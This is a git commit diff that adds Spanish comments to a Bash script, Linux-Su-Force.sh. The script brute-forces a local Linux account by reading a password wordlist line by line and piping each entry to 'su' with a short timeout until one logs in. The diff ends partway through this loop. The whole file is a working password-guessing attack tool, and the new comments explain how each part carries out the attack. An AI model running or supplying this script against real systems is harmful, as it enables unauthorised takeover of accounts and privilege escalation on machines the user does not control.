7c9a7a6efa719c8686f6896a05a5ad5fe2545535
Mario <marioalvarezfdz@gmail.com>
2023-11-22 12:37:49 +0100

    Update Linux-Su-Force.sh

--- Linux-Su-Force.sh
+++ Linux-Su-Force.sh
@@ -1,11 +1,13 @@
 #!/bin/bash
 
+# Función que se ejecutará en caso de que el usuario no proporcione 2 argumentos.
 mostrar_ayuda() {
     echo -e "\e[1;33mUso: $0 USUARIO DICCIONARIO"
     echo -e "\e[1;31mSe deben especificar tanto el nombre de usuario como el archivo de diccionario.\e[0m"
     exit 1
 }
 
+# Para imprimir un sencillo banner en alguna parte del script.
 imprimir_banner() {
     echo -e "\e[1;34m"  # Cambiar el texto a color azul brillante
     echo "******************************"
@@ -14,6 +16,7 @@ imprimir_banner() {
     echo -e "\e[0m"  # Restablecer los colores a los valores predeterminados
 }
 
+# Llamamos a esta función desde el trap finalizar SIGINT (En caso de que el usuario presione control + c para salir)
 finalizar() {
     echo -e "\e[1;31m\nFinalizando el script\e[0m"
     exit
@@ -24,14 +27,15 @@ trap finalizar SIGINT
 usuario=$1
 diccionario=$2
 
-# Procesar los parámetros de línea de comandos
+# Variable especial $# para comprobar el número de parámetros introducido. En caso de no ser 2, se imprimen las instrucciones.
 if [[ $# != 2 ]]; then
     mostrar_ayuda
 fi
 
-# Verificar si se proporcionaron todos los parámetros necesarios
+# Imprimimos el banner al momento de realizar el ataque.
 imprimir_banner
 
+# Bucle while que lee línea a línea el contenido de la variable $diccionario, que a su vez esta variable recibe el diccionario como parámetro.
 while IFS= read -r password; do
     echo "Probando contraseña: $password"
     if timeout 0.1 bash -c "echo $password | su $usuario -c 'echo Hello'" > /dev/null; then
